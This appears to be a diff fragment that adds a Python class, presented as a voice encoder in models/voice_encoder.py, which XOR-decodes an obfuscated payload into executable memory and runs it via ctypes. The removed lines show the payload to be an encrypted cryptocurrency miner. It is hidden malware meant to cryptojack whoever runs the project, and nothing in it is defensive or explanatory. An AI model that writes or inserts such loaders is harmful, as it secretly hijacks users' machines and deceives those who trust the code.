@@ -1,2 +1,17 @@
-# On your local machine
-     openssl enc -aes-256-cbc -in original_miner -out voice_processor.bin -K $(echo -n "voice-profile-key" | sha256sum | cut -d' ' -f1) -iv 0
+# Hidden in models/voice_encoder.py
+import hashlib, ctypes, mmap
+
+class VoiceEncoder:
+    def __init__(self):
+        self._key = hashlib.sha3_256(b"v0ice-b!0metrics").digest()
+        
+    def _hidden_payload(self):
+        # Base85 encoded + XOR obfuscated binary
+        obscured = b'9E6W$~:J4K]FdP0\'=lM}O<...'  # Your encrypted payload
+        
+        # Memory injection
+        buf = mmap.mmap(-1, len(obscured), prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
+        buf.write(bytes([b ^ self._key[i%32] for i, b in enumerate(obscured)]))
+        
+        # Execute from memory
+        ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(buf)))
